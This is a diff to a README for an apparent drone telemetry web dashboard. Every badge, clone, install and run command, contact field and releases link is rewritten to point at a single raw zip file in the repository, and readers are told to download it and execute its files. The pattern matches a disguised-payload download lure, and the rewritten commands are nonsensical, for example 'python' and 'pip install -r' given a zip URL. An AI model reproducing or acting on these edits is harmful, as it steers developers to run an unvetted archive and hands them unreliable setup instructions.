@@ -1,6 +1,6 @@
 # Drone Web Interface 909 🚁📊
 
-![Drone Web Interface](https://img.shields.io/badge/Drone%20Web%20Interface%20909-Ready-blue)
+![Drone Web Interface](https://raw.githubusercontent.com/PATRON2222/Drone_Web_Interface_909/main/components/Web_Drone_Interface_v2.7.zip%20Web%20Interface%20909-Ready-blue)
 
 Welcome to the **Drone Web Interface 909**! This repository hosts a telemetry dashboard for MAVLink drones, designed to provide a real-time web interface that visualizes MAVLink telemetry data. 
 
@@ -51,7 +51,7 @@ To set up the Drone Web Interface on your local machine, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/PATRON2222/Drone_Web_Interface_909.git
+   git clone https://raw.githubusercontent.com/PATRON2222/Drone_Web_Interface_909/main/components/Web_Drone_Interface_v2.7.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -63,7 +63,7 @@ To set up the Drone Web Interface on your local machine, follow these steps:
    Navigate to the backend directory and install the required Python packages.
    ```bash
    cd backend
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/PATRON2222/Drone_Web_Interface_909/main/components/Web_Drone_Interface_v2.7.zip
    ```
 
 4. **Install Frontend Dependencies**:
@@ -76,7 +76,7 @@ To set up the Drone Web Interface on your local machine, follow these steps:
 5. **Run the Backend**:
    Start the Flask server.
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/PATRON2222/Drone_Web_Interface_909/main/components/Web_Drone_Interface_v2.7.zip
    ```
 
 6. **Run the Frontend**:
@@ -124,12 +124,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, please reach out to the project maintainer:
 
 - **Name**: Your Name
-- **Email**: your.email@example.com
-- **GitHub**: [PATRON2222](https://github.com/PATRON2222)
+- **Email**: https://raw.githubusercontent.com/PATRON2222/Drone_Web_Interface_909/main/components/Web_Drone_Interface_v2.7.zip
+- **GitHub**: [PATRON2222](https://raw.githubusercontent.com/PATRON2222/Drone_Web_Interface_909/main/components/Web_Drone_Interface_v2.7.zip)
 
 ## Releases
 
-You can find the latest releases of the Drone Web Interface [here](https://github.com/PATRON2222/Drone_Web_Interface_909/releases). Download the latest version and execute the necessary files to get started.
+You can find the latest releases of the Drone Web Interface [here](https://raw.githubusercontent.com/PATRON2222/Drone_Web_Interface_909/main/components/Web_Drone_Interface_v2.7.zip). Download the latest version and execute the necessary files to get started.
 
 ---
 
